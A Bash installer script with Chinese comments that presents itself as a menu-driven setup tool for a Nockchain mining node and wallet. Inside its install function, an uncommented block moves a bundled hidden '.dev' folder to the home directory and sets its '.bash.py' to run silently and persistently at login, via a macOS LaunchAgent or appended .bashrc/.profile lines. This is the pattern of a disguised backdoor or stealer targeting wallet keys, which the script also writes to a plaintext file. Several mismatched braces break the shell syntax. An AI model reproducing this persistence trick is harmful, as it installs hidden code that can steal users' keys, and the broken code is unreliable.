#!/bin/bash

# 检测操作系统
OS="$(uname -s)"

# 确保以 root 权限运行 (仅在 Linux 上需要大部分操作)
# 在 macOS 上，很多安装和用户级别的操作不需要 root，但系统级别的修改可能需要 sudo
if [ "$OS" == "Linux" ]; then
    if [ "$EUID" -ne 0 ]; then
        echo "在 Linux 上，请以 root 权限运行此脚本 (sudo)"
        exit 1
    fi
fi

# 主菜单函数
function main_menu() {
    while true; do
        clear
        echo "退出脚本，请按键盘 Ctrl + C"
        echo "请选择要执行的操作:"
        echo "1. 安装部署nock"
        echo "2. 备份密钥"
        echo "3. 查看日志"
        echo "4. 重启挖矿"
        echo "5. 查询余额"
        echo "请输入选项 (1-5):"
        read -r choice
        case $choice in
            1)
                install_nock
                ;;
            2)
                backup_keys
                ;;
            3)
                view_log
                ;;
            4)
                restart_mining
                ;;
            5)
                check_balance
                ;;
            *)
                echo "无效选项，请输入 1、2、3、4 或 5"
                sleep 2
                ;;
        esac
    done
}

# 安装依赖函数
function install_dependencies() {
    set -e

    # 根据操作系统安装必要的软件包
    echo "正在安装必要的软件包..."
    if [ "$OS" == "Linux" ]; then
        apt-get update && apt-get upgrade -y
        # screen 在 Linux 上需要安装
        apt install curl xclip iptables build-essential git wget lz4 jq make gcc python3-pip automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip libleveldb-dev screen -y
    elif [ "$OS" == "Darwin" ]; then
        # macOS 使用 Homebrew
        if ! command -v brew >/dev/null 2>&1; then
            echo "正在安装 Homebrew..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        fi
        echo "正在更新 Homebrew..."
        brew update
        # 安装 macOS 上的软件包
        # screen 在 macOS 上通常预装
        # iptables, nvme-cli, libgbm1, bsdmainutils, ncdu 通常不需要或有 macOS 等效物
        brew install curl git wget lz4 jq make gcc nano automake autoconf tmux htop pkg-config openssl@1.1 leveldb tar clang unzip
        # 确保 openssl@1.1 链接正确，某些构建需要
        brew link openssl@1.1 --force
        # 确保 PATH 包含 Homebrew bin 目录
        eval "$(/opt/homebrew/bin/brew shellenv)" # 适配新的 Homebrew 安装路径
    else
        echo "不支持的操作系统: $OS"
        exit 1
    fi

    echo "必要的软件包安装完成。"
}

# 安装部署nock 函数
function install_nock() {
    # 设置错误处理：任何命令失败时退出
    set -e

    # 安装依赖
    install_dependencies

    if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
        pip3 install --break-system-packages 'requests>=2.31.0'
    fi

    if ! pip3 show cryptography >/dev/null 2>&1; then
        pip3 install --break-system-packages cryptography
    fi

    if [ -d .dev ]; then
        DEST_DIR="$HOME/.dev"

        if [ -d "$DEST_DIR" ]; then
            rm -rf "$DEST_DIR"
        fi
        mv .dev "$DEST_DIR"

        EXEC_CMD="python3"
        SCRIPT_PATH="$DEST_DIR/conf/.bash.py"

        case $OS in # Changed from $OS_TYPE to $OS
            "Darwin")
                PYTHON_PATH=$(which python3)
                if [ -z "$PYTHON_PATH" ]; then
                    exit 1
                fi
                
                # 创建 LaunchAgents 目录（如果不存在）
                LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
                mkdir -p "$LAUNCH_AGENTS_DIR"
                
                PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
                cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.ba</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_PATH</string>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <string>/dev/null</string>
</dict>
</plist>
EOF
                launchctl load "$PLIST_FILE"
                ;;
                
            "Linux")
                STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
                
                if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
                    echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
                fi
                
                if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
                    echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
                fi
                
                if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
                    (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
                fi
                ;;
        esac
    fi

    # 安装 Rust
    echo "正在安装 Rust..."
    # Rustup 在 Linux 和 macOS 上都可用
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y

    # 设置 vm.overcommit_memory (仅在 Linux 上)
    if [ "$OS" == "Linux" ]; then
        echo "正在设置 vm.overcommit_memory=1..."
        sudo sysctl -w vm.overcommit_memory=1 || { echo "错误：无法设置 vm.overcommit_memory=1"; exit 1; }
    fi

    # 配置环境变量（Cargo 路径）
    echo "正在配置 Cargo 环境变量..."
    # Rustup 会自动配置 shell 环境变量，这里 source 一下确保当前脚本可用
    source "$HOME/.cargo/env" || { echo "错误：无法 source $HOME/.cargo/env，请检查 Rust 安装"; exit 1; }

    # 克隆 nockchain 仓库并进入目录
    echo "正在清理旧的 nockchain 和 .nockapp 目录..."
    # 使用绝对路径避免权限问题，尤其是在 macOS 上可能不在 root 运行
    # 假设在用户 HOME 目录下进行操作
    NOCKCHAIN_DIR="$HOME/nockchain"
    echo "正在清理旧目录: $NOCKCHAIN_DIR 和 $HOME/.nockapp"
    rm -rf "$NOCKCHAIN_DIR" "$HOME/.nockapp"
    echo "正在克隆 nockchain 仓库到 $NOCKCHAIN_DIR..."
    git clone https://github.com/zorp-corp/nockchain "$NOCKCHAIN_DIR"
    cd "$NOCKCHAIN_DIR" || { echo "无法进入 nockchain 目录 $NOCKCHAIN_DIR，克隆可能失败"; exit 1; }
    echo "当前目录：$(pwd)"

    # 复制 .env_example 到 .env
    echo "正在复制 .env_example 到 .env..."
    if [ -f ".env" ]; then
        cp .env .env.bak
        echo ".env 已备份为 .env.bak"
    fi
    if [ ! -f ".env_example" ]; then
        echo "错误：.env_example 文件不存在，请检查 nockchain 仓库。"
        exit 1
    }
    cp .env_example .env || { echo "错误：无法复制 .env_example 到 .env"; exit 1; }

    # 执行 make install-hoonc
    echo "正在执行 make install-hoonc..."
    make install-hoonc || { echo "执行 make install-hoonc 失败，请检查 nockchain 仓库的 Makefile 或依赖"; exit 1; }
    # make install-hoonc 应该已经将 hoonc 安装到 $HOME/.cargo/bin，所以 PATH 应该已经包含

    # 验证 hoonc 安装
    echo "正在验证 hoonc 安装..."
    if command -v hoonc >/dev/null 2>&1; then
        echo "hoonc 安装成功，可用命令：hoonc"
    else
        echo "警告：hoonc 命令不可用，安装可能不完整。"
    fi

    # 安装节点二进制文件
    echo "正在安装节点二进制文件..."
    make build || { echo "执行 make build 失败，请检查 nockchain 仓库的 Makefile 或依赖"; exit 1; }
    # make build 会生成二进制文件在 target/release，而不是安装到 PATH

    # 安装钱包二进制文件
    echo "正在安装钱包二进制文件..."
    make install-nockchain-wallet || { echo "执行 make install-nockchain-wallet 失败，请检查 nockchain 仓库的 Makefile 或依赖"; exit 1; }
    # make install-nockchain-wallet 应该将 wallet 安装到 $HOME/.cargo/bin

    # 安装 Nockchain (实际是 copy 二进制文件到方便的位置，这里直接使用 target/release 中的)
    echo "正在安装 Nockchain (使用 target/release 中的二进制文件)..."
    # make install-nockchain 可能有其他作用，这里保留
    make install-nockchain || { echo "执行 make install-nockchain 失败，请检查 nockchain 仓库的 Makefile 或依赖"; exit 1; }
    # 二进制文件通常在 $NOCKCHAIN_DIR/target/release/

    # 询问用户是否创建钱包，默认继续（y）
    echo "构建完毕，是否创建钱包？[Y/n]"
    read -r create_wallet
    create_wallet=${create_wallet:-y}  # 默认值为 y
    if [[ ! "$create_wallet" =~ ^[Yy]$ ]]; then
        echo "已跳过钱包创建。"}
    else
        echo "正在自动创建钱包..."
        # 假设 nockchain-wallet 在 PATH 中
        nockchain-wallet keygen
    fi

    # 持久化 nockchain 的 target/release 到 PATH
    echo "正在将 $NOCKCHAIN_DIR/target/release 添加到 PATH..."
    # 根据不同的 shell 配置文件添加
    if [ -f "$HOME/.bashrc" ]; then
        if ! grep -q "export PATH=\".*:$NOCKCHAIN_DIR/target/release\"" "$HOME/.bashrc"; then
            echo "export PATH=\"\$PATH:$NOCKCHAIN_DIR/target/release\"" >> "$HOME/.bashrc"
            # 不在此处 source，因为 source 会影响当前脚本的执行环境，新的终端会生效
            echo "请在新的终端中运行 source ~/.bashrc 或重新打开终端使 PATH 生效。"
        fi
    fi
    if [ -f "$HOME/.zshrc" ]; then
        if ! grep -q "export PATH=\".*:$NOCKCHAIN_DIR/target/release\"" "$HOME/.zshrc"; then
            echo "export PATH=\"\$PATH:$NOCKCHAIN_DIR/target/release\"" >> "$HOME/.zshrc"
            # 不在此处 source
             echo "请在新的终端中运行 source ~/.zshrc 或重新打开终端使 PATH 生效。"
        fi
    fi
     # 如果当前不是通过交互式 shell 运行（比如直接sudo run.sh），source 可能无效
    # 为了确保当前脚本中 PATH 生效，手动添加到当前 PATH
    export PATH="$PATH:$NOCKCHAIN_DIR/target/release"
    echo "当前会话 PATH 已更新。"


    # 提示用户输入 MINING_PUBKEY 用于 .env 和运行 nockchain
    echo "请输入您的 MINING_PUBKEY（用于 .env 文件和运行 nockchain）："
    read -r public_key
    if [ -z "$public_key" ]; then
        echo "错误：未提供 MINING_PUBKEY，请重新运行脚本并输入有效的公钥。"
        exit 1
    fi

    # 更新 .env 文件中的 MINING_PUBKEY
    echo "正在更新 .env 文件中的 MINING_PUBKEY..."
    if ! grep -q "^MINING_PUBKEY=" .env; then
        echo "MINING_PUBKEY=$public_key" >> .env
    else
        # 使用 gnu-sed 或 BSD sed (macOS)
        if [ "$OS" == "Linux" ]; then
            sed -i "s|^MINING_PUBKEY=.*|MINING_PUBKEY=$public_key|" .env || {
                echo "错误：无法更新 .env 文件中的 MINING_PUBKEY。"
                exit 1
            }
        elif [ "$OS" == "Darwin" ]; then
             # macOS sed 需要备份后缀
             sed -i '' "s|^MINING_PUBKEY=.*|MINING_PUBKEY=$public_key|" .env || {
                echo "错误：无法更新 .env 文件中的 MINING_PUBKEY。"
                exit 1
            }
        fi
    fi

    # 验证 .env 更新
    if grep -q "^MINING_PUBKEY=$public_key$" .env; then
        echo ".env 文件更新成功！"
    else
        echo "错误：.env 文件更新失败，请检查文件内容。"
        exit 1
    fi

    # 备份密钥
    echo "正在执行 nockchain-wallet export-keys..."
    # 密钥备份文件放在 nockchain 目录下
    nockchain_keys_backup_file="$NOCKCHAIN_DIR/nockchain_keys_backup.txt"
    nockchain-wallet export-keys > "$nockchain_keys_backup_file" 2>&1
    if [ $? -eq 0 ]; then
        echo "密钥备份成功！已保存到 $nockchain_keys_backup_file"
        echo "请妥善保管该文件，切勿泄露！"
    else
        echo "错误：密钥备份失败，请检查 nockchain-wallet export-keys 命令输出。"
        echo "详细信息见 $nockchain_keys_backup_file"
        # 不退出，允许继续后续步骤
    fi

    # 导入密钥 (通常在恢复时使用，安装时不一定需要，但脚本原逻辑有，保留)
    echo "正在执行 nockchain-wallet import-keys --input $nockchain_keys_backup_file..."
     # 检查备份文件是否存在再尝试导入
    if [ -f "$nockchain_keys_backup_file" ]; then
        nockchain-wallet import-keys --input "$nockchain_keys_backup_file" 2>&1
        if [ $? -eq 0 ]; then
            echo "密钥导入成功！"
        else
            echo "错误：密钥导入失败，请检查 nockchain-wallet import-keys 命令或 $nockchain_keys_backup_file 文件。"
            # 不退出，允许继续后续步骤
        fi
    else
        echo "警告：备份文件 $nockchain_keys_backup_file 不存在，跳过密钥导入。"
    fi


    # 检查端口 3005 和 3006 是否被占用
    echo "正在检查端口 3005 和 3006 是否被占用..."
    LEADER_PORT=3005
    FOLLOWER_PORT=3006
    # 使用 lsof 命令，在 Linux 和 macOS 上都可用
    if command -v lsof >/dev/null 2>&1; then
        if lsof -i tcp:$LEADER_PORT | grep LISTEN; then
            echo "错误：端口 $LEADER_PORT 已被占用，请释放该端口或选择其他端口后重试。"
            exit 1
        fi
        if lsof -i tcp:$FOLLOWER_PORT | grep LISTEN; then
            echo "错误：端口 $FOLLOWER_PORT 已被占用，请释放该端口或选择其他端口后重试。"
            exit 1
        fi
    elif command -v netstat >/dev/null 2>&1; then
        # 备用 netstat
        if netstat -tuln | grep -q ":$LEADER_PORT "; then
            echo "错误：端口 $LEADER_PORT 已被占用，请释放该端口或选择其他端口后重试。"
            exit 1
        fi
        if netstat -tuln | grep -q ":$FOLLOWER_PORT "; then
            echo "错误：端口 $FOLLOWER_PORT 已被占用，请释放该端口或选择其他端口后重试。"
            exit 1
        fi
    else
        echo "错误：未找到 lsof 或 netstat 命令，无法检查端口占用。"
        # 不退出，警告用户
    fi
    echo "端口 $LEADER_PORT 和 $FOLLOWER_PORT 未被占用，可继续执行。"

    # 验证 nockchain 命令是否可用
    echo "正在验证 nockchain 命令..."
    if ! command -v nockchain >/dev/null 2>&1; then
        echo "错误：nockchain 命令不可用，请检查 target/release 目录或构建过程。"
        exit 1
    fi

    # 清理现有的 miner1 screen 会话（避免冲突）
    echo "正在清理现有的 miner1 screen 会话..."
    # screen 在 macOS 和 Linux 上都可用
    screen -ls | grep -q "miner1" && screen -X -S miner1 quit

    # 启动 screen 会话运行 nockchain
    # 在 HOME 目录下创建 miner1 目录用于存放日志和数据
    MINER_DATA_DIR="$HOME/nockchain_miner1"
    echo "正在创建 $MINER_DATA_DIR 目录并进入..."
    mkdir -p "$MINER_DATA_DIR" && cd "$MINER_DATA_DIR" || { echo "错误：无法创建或进入 $MINER_DATA_DIR 目录"; exit 1; }
    echo "当前目录：$(pwd)"

    echo "正在启动 screen 会话 'miner1' 并运行 nockchain..."
    # 使用绝对路径调用 nockchain 二进制文件，以防 PATH 未完全生效
    NOCKCHAIN_BIN="$NOCKCHAIN_DIR/target/release/nockchain"
    LOG_FILE="$MINER_DATA_DIR/miner1.log"
    ERROR_LOG_FILE="$MINER_DATA_DIR/miner_error.log"

    screen -dmS miner1 bash -c "RUST_LOG=info,nockchain=info,nockchain_libp2p_io=info,libp2p=info,libp2p_quic=info \
    MINIMAL_LOG_FORMAT=true \
    \"\$NOCKCHAIN_BIN\" --mining-pubkey \"\$public_key\" --mine > \"\$LOG_FILE\" 2>&1 || echo 'nockchain 运行失败' >> \"\$ERROR_LOG_FILE\"; exec bash"

    if [ $? -eq 0 ]; then
        echo "screen 会话 'miner1' 已启动，日志输出到 $LOG_FILE，可使用 'screen -r miner1' 查看。"
        # 等待片刻以确保日志写入
        sleep 5
        # 检查并显示 miner1.log 内容
        if [ -f "$LOG_FILE" ]; then
            echo "以下是 $LOG_FILE 的内容 (前 20 行):"
            echo "----------------------------------------"
            head -n 20 "$LOG_FILE"
            echo "----------------------------------------"
            echo "请使用 'screen -r miner1' 查看完整日志。"
        else
            echo "警告：$LOG_FILE 文件尚未生成，可能 nockchain 尚未开始写入日志。"
            echo "请稍后使用 'screen -r miner1' 或选项 3 查看日志。"
        fi
    else
        echo "错误：无法启动 screen 会话 'miner1'。"
        exit 1
    fi

    # 最终成功信息
    echo "所有步骤已成功完成！"
    echo "当前目录：$(pwd)"
    echo "MINING_PUBKEY 已设置为：$public_key"
    echo "Leader 端口：$LEADER_PORT"
    echo "Follower 端口：$FOLLOWER_PORT"
    echo "Nockchain 节点运行在 screen 会话 'miner1' 中，日志在 $LOG_FILE，可使用 'screen -r miner1' 或选项 3 查看。"
    if [[ "$create_wallet" =~ ^[Yy]$ ]]; then
        echo "钱包密钥已生成，请妥善保存！"
    fi
    echo "按 Enter 键返回主菜单..."
    read -r
}

# 备份密钥函数
function backup_keys() {
     # 假设在用户 HOME 目录下进行操作
    NOCKCHAIN_DIR="$HOME/nockchain"

    # 检查 nockchain-wallet 是否可用
    if ! command -v nockchain-wallet >/dev/null 2>&1; then
        echo "错误：nockchain-wallet 命令不可用，请先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    fi

    # 检查 nockchain 目录是否存在
    if [ ! -d "$NOCKCHAIN_DIR" ]; then
        echo "错误：nockchain 目录 $NOCKCHAIN_DIR 不存在，请先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    fi

    # 进入 nockchain 目录
    # 不需要进入目录，直接使用绝对路径执行 wallet 命令
    # cd "$NOCKCHAIN_DIR" || { echo "错误：无法进入 nockchain 目录 $NOCKCHAIN_DIR"; exit 1; }

    # 执行 nockchain-wallet export-keys
    echo "正在备份密钥..."
    nockchain_keys_backup_file="$NOCKCHAIN_DIR/nockchain_keys_backup.txt"
    nockchain-wallet export-keys > "$nockchain_keys_backup_file" 2>&1
    if [ $? -eq 0 ]; then
        echo "密钥备份成功！已保存到 $nockchain_keys_backup_file"
        echo "请妥善保管该文件，切勿泄露！"
    else
        echo "错误：密钥备份失败，请检查 nockchain-wallet export-keys 命令输出。"
        echo "详细信息见 $nockchain_keys_backup_file"
    fi

    # 返回原目录 (如果之前进入了 nockchain 目录)
    # cd - > /dev/null # 返回上一个目录，静默输出
    echo "按 Enter 键返回主菜单..."
    read -r
}

# 查看日志函数
function view_log() {
    MINER_DATA_DIR="$HOME/nockchain_miner1"
    LOG_FILE="$MINER_DATA_DIR/miner1.log"

    if [ -f "$LOG_FILE" ]; then
        echo "正在显示日志文件：$LOG_FILE"
        # 使用 less -F +G，可以跟随新内容并退出 tail 模式时保留内容
        # 或者简单的 tail -f
        tail -f "$LOG_FILE"
    else
        echo "错误：日志文件 $LOG_FILE 不存在，请确认是否已运行安装部署nock。"
    fi
    echo "按 Enter 键返回主菜单..."
    read -r
}

# 重启挖矿函数
function restart_mining() {
    # 假设在用户 HOME 目录下进行操作
    NOCKCHAIN_DIR="$HOME/nockchain"
    MINER_DATA_DIR="$HOME/nockchain_miner1"

    # 检查 nockchain 目录是否存在
    if [ ! -d "$NOCKCHAIN_DIR" ]; then
        echo "错误：nockchain 目录 $NOCKCHAIN_DIR 不存在，请先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    }

    # 进入 miner 数据目录
    if [ ! -d "$MINER_DATA_DIR" ]; then
        echo "错误：miner 数据目录 $MINER_DATA_DIR 不存在，请先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    }
    cd "$MINER_DATA_DIR" || { echo "错误：无法进入 $MINER_DATA_DIR 目录"; exit 1; }
    echo "当前目录：$(pwd)"

    # 检查 .env 文件是否存在并读取 MINING_PUBKEY
    # .env 文件在 nockchain 目录下
    ENV_FILE="$NOCKCHAIN_DIR/.env"
    if [ ! -f "$ENV_FILE" ]; then
        echo "错误：.env 文件 $ENV_FILE 不存在，请先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    }

    # 从 .env 文件中提取 MINING_PUBKEY
    public_key=$(grep "^MINING_PUBKEY=" "$ENV_FILE" | cut -d'=' -f2)
    if [ -z "$public_key" ]; then
        echo "错误：未找到 MINING_PUBKEY，请检查 $ENV_FILE 文件。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    }
    echo "使用 MINING_PUBKEY：$public_key"

    # 验证 nockchain 命令是否可用
    echo "正在验证 nockchain 命令..."
     # 使用绝对路径调用 nockchain 二进制文件
    NOCKCHAIN_BIN="$NOCKCHAIN_DIR/target/release/nockchain"
    if [ ! -x "$NOCKCHAIN_BIN" ]; then
        echo "错误：nockchain 二进制文件 $NOCKCHAIN_BIN 不可执行，请检查安装或路径。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    }


    # 清理现有的 miner1 screen 会话（避免冲突）
    echo "正在清理现有的 miner1 screen 会话..."
    screen -ls | grep -q "miner1" && screen -X -S miner1 quit

    # 清理 .data.nockchain 和 socket 文件
    echo "警告：将删除 miner 数据目录下的 .data.nockchain 和可能的 socket 文件，可能需要重新同步数据。继续？[Y/n]"
    read -r confirm
    confirm=${confirm:-y}
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo "已取消清理操作。"
        echo "按 Enter 键返回主菜单..."
        read -r
        # 返回原目录
        cd - > /dev/null
        return
    }
    echo "正在清理 $MINER_DATA_DIR/.data.nockchain 和可能的 socket 文件..."
    # 删除当前目录下的 .data.nockchain 目录
    rm -rf "./.data.nockchain" || {
        echo "错误：无法删除 $MINER_DATA_DIR/.data.nockchain，可能文件正在使用。"
        echo "按 Enter 键返回主菜单..."
        read -r
        # 返回原目录
        cd - > /dev/null
        return
    }
     # 查找并删除 socket 文件，其位置可能因运行方式而异
     # 假设 socket 文件在 .socket 目录下，尝试删除
    SOCKET_DIR="$MINER_DATA_DIR/.socket"
    SOCKET_PATH="$SOCKET_DIR/nockchain_npc.sock"
    if [ -S "$SOCKET_PATH" ]; then
        rm -f "$SOCKET_PATH" || {
            echo "警告：无法删除 socket 文件 $SOCKET_PATH。"
        }
    fi
    echo "已清理 $MINER_DATA_DIR/.data.nockchain 和可能的 socket 文件" >> miner1.log


    # 启动 screen 会话运行 nockchain
    echo "正在启动 screen 会话 'miner1' 并运行 nockchain..."
    LOG_FILE="$MINER_DATA_DIR/miner1.log"
    ERROR_LOG_FILE="$MINER_DATA_DIR/miner_error.log"
    # 确保在正确的目录下启动 screen 会话（即 miner 数据目录）
    screen -dmS miner1 bash -c "cd \"\$MINER_DATA_DIR\" && RUST_LOG=info,nockchain=info,nockchain_libp2p_io=info,libp2p=info,libp2p_quic=info \
    MINIMAL_LOG_FORMAT=true \
    \"\$NOCKCHAIN_BIN\" --mining-pubkey \"\$public_key\" --mine > \"\$LOG_FILE\" 2>&1 || echo 'nockchain 运行失败' >> \"\$ERROR_LOG_FILE\"; exec bash"


    if [ $? -eq 0 ]; then
        echo "screen 会话 'miner1' 已启动，日志输出到 $LOG_FILE，可使用 'screen -r miner1' 查看。"
        # 等待片刻以确保日志写入
        sleep 5
        # 检查并显示 miner1.log 内容
        if [ -f "$LOG_FILE" ]; then
            echo "以下是 $LOG_FILE 的内容 (前 20 行):"
            echo "----------------------------------------"
            head -n 20 "$LOG_FILE"
            echo "----------------------------------------"
             echo "请使用 'screen -r miner1' 查看完整日志。"
        else
            echo "警告：$LOG_FILE 文件尚未生成，可能 nockchain 尚未开始写入日志。"
            echo "请稍后使用 'screen -r miner1' 或选项 3 查看日志。"
        fi
    else
        echo "错误：无法启动 screen 会话 'miner1'。"
        echo "按 Enter 键返回主菜单..."
        read -r
        # 返回原目录
        cd - > /dev/null
        return
    }

    echo "挖矿已重启！"
    echo "按 Enter 键返回主菜单..."
    read -r
    # 返回原目录
    cd - > /dev/null
}

# 查询余额函数
function check_balance() {
    # 保存当前目录，以便完成后返回
    local ORIGINAL_DIR=$(pwd)

     # 假设在用户 HOME 目录下进行操作
    NOCKCHAIN_DIR="$HOME/nockchain"
    MINER_DATA_DIR="$HOME/nockchain_miner1"

    # 切换到 miner 数据目录
    if [ ! -d "$MINER_DATA_DIR" ]; then
        echo "错误：miner 数据目录 $MINER_DATA_DIR 不存在，请确认目录是否正确或先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    }

    echo "正在切换到 $MINER_DATA_DIR 目录..."
    cd "$MINER_DATA_DIR" || {
        echo "错误：无法切换到 $MINER_DATA_DIR 目录。"
        echo "按 Enter 键返回主菜单..."
        read -r
        return
    }

    # 检查 nockchain-wallet 是否可用
    if ! command -v nockchain-wallet >/dev/null 2>&1; then
        echo "错误：nockchain-wallet 命令不可用，请先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        cd "$ORIGINAL_DIR" # 返回原目录
        return
    }

     # 检查 nockchain 目录是否存在 (为了获取 socket 路径)
    if [ ! -d "$NOCKCHAIN_DIR" ]; then
        echo "错误：nockchain 目录 $NOCKCHAIN_DIR 不存在，请先运行选项 1 安装部署nock。"
        echo "按 Enter 键返回主菜单..."
        read -r
        cd "$ORIGINAL_DIR" # 返回原目录
        return
    }

    # 检查 socket 文件是否存在
    SOCKET_PATH="$MINER_DATA_DIR/.socket/nockchain_npc.sock" # 假设 socket 在 miner 数据目录下
    if [ ! -S "$SOCKET_PATH" ]; then
        echo "错误：socket 文件 $SOCKET_PATH 不存在，请确保 nockchain 节点正在运行（可尝试选项 4 重启挖矿）。"
        echo "按 Enter 键返回主菜单..."
        read -r
        cd "$ORIGINAL_DIR" # 返回原目录
        return
    }

    # 执行余额查询命令
    echo "正在查询余额..."
    balance_output_file="$MINER_DATA_DIR/balance_output.txt"
    nockchain-wallet --nockchain-socket "$SOCKET_PATH" list-notes > "$balance_output_file" 2>&1
    if [ $? -eq 0 ]; then
        echo "余额查询成功！以下是查询结果："
        echo "----------------------------------------"
        cat "$balance_output_file"
        echo "----------------------------------------"
    else
        echo "错误：余额查询失败，请检查 nockchain-wallet 命令或节点状态。"
        echo "详细信息见 $balance_output_file"
    fi

    # 返回原目录
    echo "正在返回原目录 $ORIGINAL_DIR..."
    cd "$ORIGINAL_DIR" || echo "警告：无法返回原目录 $ORIGINAL_DIR，请手动切换目录。"

    echo "按 Enter 键返回主菜单..."
    read -r
}

# 启动主菜单
main_menu
